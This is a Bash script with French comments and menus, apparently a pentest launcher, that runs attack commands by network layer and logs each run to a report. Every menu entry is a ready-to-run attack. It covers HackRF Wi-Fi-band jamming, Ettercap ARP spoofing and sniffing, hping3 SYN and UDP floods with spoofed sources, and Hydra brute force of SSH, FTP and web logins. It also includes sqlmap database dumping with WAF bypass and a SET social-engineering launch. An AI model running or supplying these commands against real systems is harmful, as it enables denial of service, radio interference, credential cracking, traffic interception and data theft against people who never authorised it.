#!/bin/bash
# Script : pentest_toolkit.sh
# Description : Menu interactif pour exécuter des commandes de pentesting par couche et générer un rapport d'activité.
# Auteur : Pentest killer
# Date : $(date +"%Y-%m-%d")
# Remarque : Ce script est destiné à des environnements de test et nécessite des droits suffisants (sudo ou root) selon les commandes.

# Définir le fichier de log (avec date et heure pour l'unicité)
LOG_FILE="pentest_report_$(date +'%Y%m%d_%H%M%S').log"

# Fonction de log
log_action() {
    echo "$(date +'%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
}

# Fonction de confirmation
confirm_execution() {
    echo -n "Voulez-vous exécuter cette commande ? [o/n] : "
    read confirmation
    if [ "$confirmation" == "o" ] || [ "$confirmation" == "O" ]; then
        return 0
    else
        return 1
    fi
}

# Affichage du menu principal
display_menu() {
    clear
    echo "=========================================="
    echo "         Boîte à Outils de Pentest        "
    echo "=========================================="
    echo "1. Couche Physique (HackRF)"
    echo "2. Couche Liaison (Ettercap)"
    echo "3. Couche Réseau (Hping3)"
    echo "4. Couche Transport (Hydra)"
    echo "5. Couche Application (Sqlmap)"
    echo "6. Social Engineering (SET)"
    echo "7. Générer le rapport final"
    echo "8. Quitter"
    echo "=========================================="
    echo -n "Sélectionnez une option : "
    read main_option
}

#############################
# Fonctions pour chaque couche
#############################

# Couche Physique – HackRF
execute_couche_physique() {
    while true; do
        clear
        echo "=== Couche Physique (HackRF) ==="
        echo "1. Scanner les fréquences (hackrf_sweep)"
        echo "2. Générer un signal de brouillage (hackrf_transfer - TX)"
        echo "3. Enregistrer un signal (hackrf_transfer - RX)"
        echo "4. Retour au menu principal"
        echo "--------------------------------"
        echo -n "Choix : "
        read cp_choice
        case $cp_choice in
            1)
                cmd="hackrf_sweep -f 2400:2500 -w 1000000 -l 32 -g 32"
                echo "Commande : $cmd"
                log_action "Sélectionné : Scanner les fréquences avec hackrf_sweep"
                if confirm_execution; then
                    log_action "Exécution : $cmd"
                    eval $cmd
                else
                    log_action "Commande hackrf_sweep affichée mais non exécutée."
                fi
                read -p "Appuyez sur Entrée pour continuer..."
                ;;
            2)
                cmd="hackrf_transfer -t noise.bin -f 2400000000 -s 20000000 -x 47"
                echo "Commande : $cmd"
                log_action "Sélectionné : Générer un signal de brouillage (TX)"
                if confirm_execution; then
                    log_action "Exécution : $cmd"
                    eval $cmd
                else
                    log_action "Commande de brouillage affichée mais non exécutée."
                fi
                read -p "Appuyez sur Entrée pour continuer..."
                ;;
            3)
                cmd="hackrf_transfer -r capture.raw -f 2400000000 -s 20000000 -l 32 -g 32"
                echo "Commande : $cmd"
                log_action "Sélectionné : Enregistrer un signal (RX)"
                if confirm_execution; then
                    log_action "Exécution : $cmd"
                    eval $cmd
                else
                    log_action "Commande d'enregistrement affichée mais non exécutée."
                fi
                read -p "Appuyez sur Entrée pour continuer..."
                ;;
            4)
                break
                ;;
            *)
                echo "Option invalide."
                sleep 1
                ;;
        esac
    done
}

# Couche Liaison – Ettercap
execute_couche_liaison() {
    while true; do
        clear
        echo "=== Couche Liaison (Ettercap) ==="
        echo "1. Lancer Ettercap en mode texte"
        echo "2. ARP Spoofing ciblé"
        echo "3. Sniffer et logger"
        echo "4. Retour au menu principal"
        echo "--------------------------------"
        echo -n "Choix : "
        read cl_choice
        case $cl_choice in
            1)
                cmd="ettercap -T"
                echo "Commande : $cmd"
                log_action "Sélectionné : Lancer Ettercap en mode texte"
                if confirm_execution; then
                    log_action "Exécution : $cmd"
                    eval $cmd
                else
                    log_action "Commande Ettercap mode texte affichée mais non exécutée."
                fi
                read -p "Appuyez sur Entrée pour continuer..."
                ;;
            2)
                cmd="ettercap -T -M arp:remote /192.168.1.1// /192.168.1.2//"
                echo "Commande : $cmd"
                log_action "Sélectionné : ARP Spoofing ciblé"
                if confirm_execution; then
                    log_action "Exécution : $cmd"
                    eval $cmd
                else
                    log_action "Commande ARP spoofing affichée mais non exécutée."
                fi
                read -p "Appuyez sur Entrée pour continuer..."
                ;;
            3)
                cmd="ettercap -T -M arp -i eth0 -L logfile"
                echo "Commande : $cmd"
                log_action "Sélectionné : Sniffer et logger avec Ettercap"
                if confirm_execution; then
                    log_action "Exécution : $cmd"
                    eval $cmd
                else
                    log_action "Commande de sniffing affichée mais non exécutée."
                fi
                read -p "Appuyez sur Entrée pour continuer..."
                ;;
            4)
                break
                ;;
            *)
                echo "Option invalide."
                sleep 1
                ;;
        esac
    done
}

# Couche Réseau – Hping3
execute_couche_reseau() {
    while true; do
        clear
        echo "=== Couche Réseau (Hping3) ==="
        echo "1. SYN Flood"
        echo "2. UDP Flood avec fragmentation"
        echo "3. IP Spoofing avec adresses aléatoires"
        echo "4. Retour au menu principal"
        echo "--------------------------------"
        echo -n "Choix : "
        read cr_choice
        case $cr_choice in
            1)
                cmd="hping3 -S -p 80 --flood -d 1000 192.168.1.1"
                echo "Commande : $cmd"
                log_action "Sélectionné : SYN Flood avec Hping3"
                if confirm_execution; then
                    log_action "Exécution : $cmd"
                    eval $cmd
                else
                    log_action "Commande SYN Flood affichée mais non exécutée."
                fi
                read -p "Appuyez sur Entrée pour continuer..."
                ;;
            2)
                cmd="hping3 --udp -p 53 --frag -d 2000 --flood 192.168.1.1"
                echo "Commande : $cmd"
                log_action "Sélectionné : UDP Flood avec fragmentation"
                if confirm_execution; then
                    log_action "Exécution : $cmd"
                    eval $cmd
                else
                    log_action "Commande UDP Flood affichée mais non exécutée."
                fi
                read -p "Appuyez sur Entrée pour continuer..."
                ;;
            3)
                cmd="hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.1"
                echo "Commande : $cmd"
                log_action "Sélectionné : IP Spoofing avec Hping3"
                if confirm_execution; then
                    log_action "Exécution : $cmd"
                    eval $cmd
                else
                    log_action "Commande IP Spoofing affichée mais non exécutée."
                fi
                read -p "Appuyez sur Entrée pour continuer..."
                ;;
            4)
                break
                ;;
            *)
                echo "Option invalide."
                sleep 1
                ;;
        esac
    done
}

# Couche Transport – Hydra
execute_couche_transport() {
    while true; do
        clear
        echo "=== Couche Transport (Hydra) ==="
        echo "1. Bruteforce SSH"
        echo "2. Bruteforce FTP"
        echo "3. Bruteforce HTTP POST"
        echo "4. Retour au menu principal"
        echo "--------------------------------"
        echo -n "Choix : "
        read ct_choice
        case $ct_choice in
            1)
                cmd="hydra -l admin -P passlist.txt ssh://192.168.1.1"
                echo "Commande : $cmd"
                log_action "Sélectionné : Bruteforce SSH avec Hydra"
                if confirm_execution; then
                    log_action "Exécution : $cmd"
                    eval $cmd
                else
                    log_action "Commande Hydra SSH affichée mais non exécutée."
                fi
                read -p "Appuyez sur Entrée pour continuer..."
                ;;
            2)
                cmd="hydra -L users.txt -P passwords.txt -t 64 ftp://192.168.1.1"
                echo "Commande : $cmd"
                log_action "Sélectionné : Bruteforce FTP avec Hydra"
                if confirm_execution; then
                    log_action "Exécution : $cmd"
                    eval $cmd
                else
                    log_action "Commande Hydra FTP affichée mais non exécutée."
                fi
                read -p "Appuyez sur Entrée pour continuer..."
                ;;
            3)
                cmd="hydra -l user -P rockyou.txt 192.168.1.1 http-post-form \"/login.php:user=^USER^&pass=^PASS^:Invalid\""
                echo "Commande : $cmd"
                log_action "Sélectionné : Bruteforce HTTP POST avec Hydra"
                if confirm_execution; then
                    log_action "Exécution : $cmd"
                    eval $cmd
                else
                    log_action "Commande Hydra HTTP POST affichée mais non exécutée."
                fi
                read -p "Appuyez sur Entrée pour continuer..."
                ;;
            4)
                break
                ;;
            *)
                echo "Option invalide."
                sleep 1
                ;;
        esac
    done
}

# Couche Application – Sqlmap
execute_couche_application() {
    while true; do
        clear
        echo "=== Couche Application (Sqlmap) ==="
        echo "1. Détecter une injection SQL"
        echo "2. Extraire les bases de données"
        echo "3. Extraire une table spécifique"
        echo "4. Bypass WAF"
        echo "5. Retour au menu principal"
        echo "--------------------------------"
        echo -n "Choix : "
        read ca_choice
        case $ca_choice in
            1)
                cmd="sqlmap -u \"http://site.com/page?id=1\" --batch"
                echo "Commande : $cmd"
                log_action "Sélectionné : Détection d'injection SQL avec Sqlmap"
                if confirm_execution; then
                    log_action "Exécution : $cmd"
                    eval $cmd
                else
                    log_action "Commande Sqlmap (détection) affichée mais non exécutée."
                fi
                read -p "Appuyez sur Entrée pour continuer..."
                ;;
            2)
                cmd="sqlmap -u \"http://site.com/page?id=1\" --dbs"
                echo "Commande : $cmd"
                log_action "Sélectionné : Extraction des bases de données avec Sqlmap"
                if confirm_execution; then
                    log_action "Exécution : $cmd"
                    eval $cmd
                else
                    log_action "Commande Sqlmap (extraction DB) affichée mais non exécutée."
                fi
                read -p "Appuyez sur Entrée pour continuer..."
                ;;
            3)
                cmd="sqlmap -u \"http://site.com/page?id=1\" -D nom_de_base -T nom_de_table --dump"
                echo "Commande : $cmd"
                log_action "Sélectionné : Extraction d'une table spécifique avec Sqlmap"
                if confirm_execution; then
                    log_action "Exécution : $cmd"
                    eval $cmd
                else
                    log_action "Commande Sqlmap (dump table) affichée mais non exécutée."
                fi
                read -p "Appuyez sur Entrée pour continuer..."
                ;;
            4)
                cmd="sqlmap -u \"http://site.com/page?id=1\" --tamper=space2comment"
                echo "Commande : $cmd"
                log_action "Sélectionné : Bypass WAF avec Sqlmap"
                if confirm_execution; then
                    log_action "Exécution : $cmd"
                    eval $cmd
                else
                    log_action "Commande Sqlmap (bypass WAF) affichée mais non exécutée."
                fi
                read -p "Appuyez sur Entrée pour continuer..."
                ;;
            5)
                break
                ;;
            *)
                echo "Option invalide."
                sleep 1
                ;;
        esac
    done
}

# Social Engineering – SET (Social-Engineer Toolkit)
execute_social_engineering() {
    while true; do
        clear
        echo "=== Social Engineering (SET) ==="
        echo "1. Lancer SET (menu principal)"
        echo "2. Retour au menu principal"
        echo "--------------------------------"
        echo -n "Choix : "
        read se_choice
        case $se_choice in
            1)
                cmd="setoolkit"
                echo "Commande : $cmd"
                log_action "Sélectionné : Lancer Social-Engineer Toolkit (SET)"
                if confirm_execution; then
                    log_action "Exécution : $cmd"
                    eval $cmd
                else
                    log_action "Commande SET affichée mais non exécutée."
                fi
                read -p "Appuyez sur Entrée pour continuer..."
                ;;
            2)
                break
                ;;
            *)
                echo "Option invalide."
                sleep 1
                ;;
        esac
    done
}

#############################
# Générer le rapport final
#############################

generate_report() {
    echo "Génération du rapport final..."
    {
        echo "# Rapport d'activité du Pentest Toolkit"
        echo "Date : $(date)"
        echo "-----------------------------------------"
        cat "$LOG_FILE"
    } > rapport_final.md
    echo "Le rapport final a été généré dans le fichier : rapport_final.md"
    log_action "Rapport final généré."
    read -p "Appuyez sur Entrée pour continuer..."
}

#############################
# Boucle principale du menu
#############################

while true; do
    display_menu
    case $main_option in
        1) execute_couche_physique ;;
        2) execute_couche_liaison ;;
        3) execute_couche_reseau ;;
        4) execute_couche_transport ;;
        5) execute_couche_application ;;
        6) execute_social_engineering ;;
        7) generate_report ;;
        8) echo "Au revoir !"; exit 0 ;;
        *) echo "Option invalide."; sleep 1 ;;
    esac
done
